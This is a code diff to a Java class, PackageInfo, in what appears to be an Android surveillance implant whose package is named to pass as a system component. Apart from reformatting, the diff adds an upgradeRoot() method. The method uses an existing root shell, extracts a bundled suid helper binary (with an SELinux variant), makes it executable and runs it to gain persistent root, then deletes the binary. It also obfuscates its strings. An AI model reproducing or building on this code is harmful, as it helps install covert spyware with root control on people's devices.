@@ -7,33 +7,32 @@
 
 package com.android.dvci.capabilities;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.Date;
-import java.util.Iterator;
-
-import javax.xml.parsers.FactoryConfigurationError;
-import javax.xml.parsers.ParserConfigurationException;
-
-import org.xml.sax.SAXException;
-
 import android.content.Context;
 
 import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.Configuration;
-import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Execute;
 import com.android.dvci.util.ExecuteResult;
 import com.android.dvci.util.StringUtils;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
+
+import org.xml.sax.SAXException;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Date;
+
+import javax.xml.parsers.FactoryConfigurationError;
+import javax.xml.parsers.ParserConfigurationException;
 
 public class PackageInfo {
 	private static final String TAG = "PackageInfo";
@@ -124,7 +123,7 @@ public class PackageInfo {
 	static public boolean checkRoot() { //$NON-NLS-1$
 		boolean isRoot = false;
 
-		if(Status.haveRoot()){
+		if (Status.haveRoot()) {
 			return true;
 		}
 
@@ -231,7 +230,7 @@ public class PackageInfo {
 			if (file.exists()) {
 				return true;
 			}
-			
+
 			// 32_42=/system/bin/su
 			file = new File(M.e("/system/xbin/su"));
 			if (file.exists()) {
@@ -259,6 +258,44 @@ public class PackageInfo {
 			return true;
 		}
 
+		return false;
+	}
+
+	public static boolean upgradeRoot() {
+		final AutoFile file = new AutoFile(Configuration.oldShellFileBase);
+
+		if (file.exists() && file.canRead()) {
+
+			ExecuteResult p = Execute.execute(Configuration.oldShellFileBase + M.e(" qzx id"));
+			String stdout = p.getStdout();
+			if (stdout.startsWith(M.e("uid=0"))) {
+
+				final File filesPath = Status.getAppContext().getFilesDir();
+				final String path = filesPath.getAbsolutePath();
+
+				final String suidext = M.e("ss"); // suidext
+
+				AutoFile dbgd = new AutoFile(M.e("/system/bin/dbgd"));
+				if (dbgd.exists()) {
+					Utils.dumpAsset(M.e("jb.data"), suidext);// selinux_suidext
+				} else {
+					Utils.dumpAsset(M.e("sb.data"), suidext);// suidext
+				}
+
+				AutoFile suidextFile = new AutoFile(path + "/" + suidext);
+				suidextFile.chmod("755");
+				try {
+					p = Execute.execute(new String[]{Configuration.oldShellFileBase, "qzx", suidextFile.getFilename() + " rt"});
+					stdout = p.getStdout();
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (upgradeRoot), result: " + stdout);
+					}
+					return checkRoot();
+				} finally {
+					suidextFile.delete();
+				}
+			}
+		}
 		return false;
 	}
 }
